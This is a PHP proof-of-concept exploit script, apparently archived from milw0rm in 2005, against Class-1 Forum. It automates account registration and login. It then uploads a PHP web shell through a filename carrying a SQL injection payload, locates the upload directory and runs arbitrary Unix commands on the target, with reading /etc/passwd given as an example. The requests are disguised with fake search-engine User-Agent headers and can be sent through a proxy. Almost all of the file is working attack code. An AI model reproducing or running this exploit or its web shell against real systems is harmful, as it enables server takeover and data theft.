<?php

# 6.44 08/09/2005
#
# Class-1 Forum sql injection / remote code execution poc exploit
#
# coded by rgod -> http://rgod.altervista.org
#
# make these changes in php.ini if you have troubles
# with this script:
#
# allow_call_time_pass_reference = on
# register_globals = on
#
# this is my piece of poetry...

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo '<head><title>class1 remote commands execution</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      <style type="text/css">
      <!--
      body,td,th {color: #00FF00;}
      body {background-color: #000000;}
      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;
	       font-weight: bold;
	       font-style: italic;
              }
      -->
      </style></head>
      <body>
      <p class="Stile6">Class-1 Forum (possibly prior versions) remote commands execution</p>
      <p class="Stile6">a script by rgod at <a href="http://rgod.altervista.org" target="_blank">http://rgod.altervista.org</a></p>
      <table width="84%" >
      <tr>
      <td width="43%">
      <form name="form1" method="post" action="'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&command=value&proxy=value">
      <p>
       <input type="text" name="host">
      <span class="Stile5">hostname (ex: www.sitename.com) </span></p>
      <p>
        <input type="text" name="path">
        <span class="Stile5">path (ex: /class1/ or /forum/ or just /) </span></p>
      <p>
      <input type="text" name="port">
      <span class="Stile5">specify a port other than 80 (default value) </span></p>
      <p>
      <input type="text" name="command">
        <span class="Stile5">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>
      <p>
      <input type="text" name="proxy">
        <span class="Stile5">send exploit through an HTTP proxy (ip:port)  </span></p>
      <p>
          <input type="submit" name="Submit" value="go!">
      </p>
    </form></td>
    </tr>
   </table>
</body>
</html>';


function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".htmlentities($headeri[$li])."</td>";
			    }

echo "</tr></table>";
}



$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';


if (($path<>'') and ($host<>'') and ($command<>''))
{
if ($port=='') {$port=80;}


#STEP 1 -> REGISTER
$anumber=rand();

$data="username=jimihendrix".$anumber."&email=jimihendrix".$anumber."@mail.com&password=jimyjimy&password2=jimyjimy&icq=&aim=&msn=&yahoo=&website=http%3A%2F%2F&location=&occupation=&interests=&signature=&notify_private=on&post_count_per_page=10&thread_count_per_page=20&msg_count_per_page=20&date_syntax=D%2C+d+M+Y%2C+G%3Ai%3As";

if ($proxy=='')
       {
        $packet="POST ".$path."users.php?mode=postuser HTTP/1.1\r\n";

       }
else
       {
        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);
        if ($c==0) {
                    echo 'check the proxy...<br>';
	            die;
	           }
         else
        {
        $packet="POST http://".$host.$path."users.php?mode=postuser HTTP/1.1\r\n";

        }
	}

$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."users.php?mode=register\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\r\n\r\n";
$packet.=$data;

show($packet);

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));

#STEP 2 -> LOGIN
$data="username=jimihendrix".$anumber."&password=jimyjimy";
if ($proxy=='')
       {
        $packet="POST ".$path."login.php HTTP/1.1\r\n";

       }
else
       {

        $packet="POST http://".$host.$path."login.php HTTP/1.1\r\n";

       }


$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."users.php?mode=login\r\n";
$packet.="Accept-Language: ru\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\r\n\r\n";
$packet.=$data;

show($packet);

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));


#STEP 3 -> UPLOAD A FILE / SQL INJECTION

$data='-----------------------------7d51143b10418
Content-Disposition: form-data; name="filename"; filename="shell.php.'."' or 'a' ='a".'"
Content-Type: text/plain

<?php error_reporting(0); system($HTTP_GET_VARS[command]); ?>
-----------------------------7d51143b10418
Content-Disposition: form-data; name="description"


-----------------------------7d51143b10418
Content-Disposition: form-data; name="subject"


-----------------------------7d51143b10418
Content-Disposition: form-data; name="message"


-----------------------------7d51143b10418
Content-Disposition: form-data; name="inc_sig"


-----------------------------7d51143b10418--';

if ($proxy=='')
       {
        $packet="POST ".$path."viewforum.php?mode=newmessage&reply=1&id=1&forumid=1 HTTP/1.1\r\n";

       }
else
       {

       $packet="POST http://".$host.$path."viewforum.php?mode=newmessage&reply=1&id=1&forumid=1 HTTP/1.1\r\n";

       }

$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\r\n";
$packet.="Accept-Language: fr\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d51143b10418\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mediapartners-Google/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\r\n\r\n";
$packet.=$data;

show($packet);

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));



#STEP 4 -> retrieving upload directory name

if ($proxy=='')
       {
        $packet="GET ".$path."viewattach.php HTTP/1.1\r\n";
       }
else
       {
       $packet="GET http://".$host.$path."viewattach.php HTTP/1.1\r\n";
       }

$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\r\n";
$packet.="Accept-Language: fr\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\r\n\r\n";

show($packet);

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));

$location=explode('location: ',$data);
$temp=$location[1];
$temp2=explode('/',$temp);
$location=$temp2[0].'/';

if ($location=='') {
		   echo 'Some problem to retrieve upload directory...<br>';
		   echo 'check this url manually... -> <a href="http://'.$host.':'.$port.$path.'viewattach.php" target="_blank">http://'.$host.':'.$port.$path.'viewattach.php</a><br>';
		   echo 'you will be redirected to upload dir...<br>';
		   echo 'then append this filename: '."shell.php.' or 'a' ='a".' and type commands <br>';
		   echo 'appending again ?command=[your command] <br>';
		   die;
		  }

echo 'Found ... checking this location -> '.htmlentities($location);


#STEP 5 -> Launching commands...

if ($proxy=='')
       {
        $packet="GET ".$path.$location."shell.php.'%20or%20'a'%20='a?command=".urlencode($command)." HTTP/1.1\r\n";
       }
else
       {
       $packet="GET http://".$host.$path.$location."shell.php.'%20or%20'a'%20='a?command=".urlencode($command)." HTTP/1.1\r\n";
       }

$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."viewforum.php?mode=newmessage&reply=1&id=1&forumid=1\r\n";
$packet.="Accept-Language: fr\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: PHPSESSID=0c13584ef61f6c93ff80253670db5fd7\r\n\r\n";

show($packet);

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while (!feof($fp))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo 'If Class-1 Forum is unpatched and vulnerable, now you will see '.htmlentities($command).' output...';
echo nl2br(htmlentities($data));

}


?>

# milw0rm.com [2005-09-09]
